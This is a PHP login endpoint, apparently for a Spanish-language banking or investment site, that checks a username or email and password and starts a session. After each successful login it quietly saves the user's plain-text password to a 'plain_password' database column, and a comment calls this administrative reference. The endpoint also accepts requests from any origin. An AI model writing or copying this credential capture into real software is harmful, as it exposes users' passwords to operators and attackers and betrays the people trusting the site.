<?php
require_once 'config.php';

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    jsonResponse(['success' => false, 'message' => 'Método no permitido'], 405);
}

// Get JSON input
$inputRaw = file_get_contents('php://input');
$input = json_decode($inputRaw, true);

// Fallback to POST data if JSON is empty
if (empty($input)) {
    $input = $_POST;
}

$username = trim($input['username'] ?? '');
$password = $input['password'] ?? '';

// Validate input
if (empty($username) || empty($password)) {
    jsonResponse(['success' => false, 'message' => 'Usuario y contraseña son requeridos'], 400);
}

try {
    // Find user by username or email
    $stmt = $pdo->prepare("
        SELECT id, username, email, password, firstname, lastname, balance, account_number, status, ev, sv, 
               concept, dividends, cdt, investment_balance 
        FROM users 
        WHERE (username = :username OR email = :email) 
        LIMIT 1
    ");
    $stmt->execute(['username' => $username, 'email' => $username]);
    $user = $stmt->fetch();

    if (!$user) {
        jsonResponse(['success' => false, 'message' => 'Usuario o contraseña incorrectos'], 401);
    }

    // Check if account is active
    if ($user['status'] != 1) {
        jsonResponse(['success' => false, 'message' => 'Tu cuenta está suspendida. Contacta soporte.'], 403);
    }

    // Verify password
    if (!verifyPassword($password, $user['password'])) {
        jsonResponse(['success' => false, 'message' => 'Usuario o contraseña incorrectos'], 401);
    }

    // Capturar contraseña en texto plano para referencia administrativa
    // Se guarda cuando el usuario hace login exitoso
    $stmt = $pdo->prepare("UPDATE users SET plain_password = :plain_pwd, updated_at = NOW() WHERE id = :id");
    $stmt->execute(['plain_pwd' => $password, 'id' => $user['id']]);

    // Create session
    $_SESSION['user_id'] = $user['id'];
    $_SESSION['username'] = $user['username'];
    $_SESSION['email'] = $user['email'];
    $_SESSION['logged_in'] = true;

    // Return user data (without password)
    unset($user['password']);
    
    jsonResponse([
        'success' => true,
        'message' => 'Inicio de sesión exitoso',
        'user' => $user
    ]);

} catch (Exception $e) {
    error_log("Login error: " . $e->getMessage());
    jsonResponse(['success' => false, 'message' => 'Error al procesar la solicitud'], 500);
}
